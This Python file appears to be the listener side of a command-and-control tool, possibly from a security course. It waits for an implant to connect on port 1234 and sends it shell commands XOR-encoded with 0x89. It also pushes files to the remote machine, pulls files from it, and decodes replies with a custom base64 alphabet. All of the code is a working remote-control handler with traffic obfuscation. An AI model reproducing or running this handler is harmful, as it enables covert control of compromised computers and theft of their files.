import socket
import os
import string
import base64

HOST = '0.0.0.0'
PORT = 1234

def customb64(xored):
    cust = "uLoqK3h57MieJNUPzmdG1A9DCZBtjwlOVWaYTcx2pI/g0rb+4SfE6nFRHvyXkQs8"
    b64 =  "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

    new64 = str.maketrans(cust, b64)
    result = xored.translate(new64)

    result += '='
    return base64.b64decode(result).decode()
    

def xor(command):
    # xor part
    xored = b''
    command = command.encode('utf-8')
    for byte in command:
        xored += bytes([byte ^ 0x89])
    return xored

def main():
    # Start listening
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(3)
    print("Listening for connection")
    conn, addr = s.accept()

    ci = 4

    while(True):
        boolean = True
        command = input("476-1337 >>> ")
        if command == "exit":
            print("Peace out bro....")
            s.close()
            exit()
        elif "upload" in command:
            result = xor(command)
            conn.send(result)
            # Ask for source and destination from here
            print("Upload your file")
            file = input("What file do you want to upload: ")
            filecon = open(file, "r")
            bytez = filecon.read()
            conn.send(xor(bytez))
            boolean = False
        elif command == "download":
            result = xor(command)
            conn.send(result)
            # Get the file name from here
            print("Downloading file to current directory")
            file = input("What file do you want to download: ")
            result = xor(file)
            conn.send(result)
        else:
            result = xor(command)
            conn.send(result)

        if boolean:
            reply = conn.recv(100000)
            print("Result:\n ")
            print(reply.decode())
            print(customb64(reply.decode()))


if __name__ == "__main__":
    main()
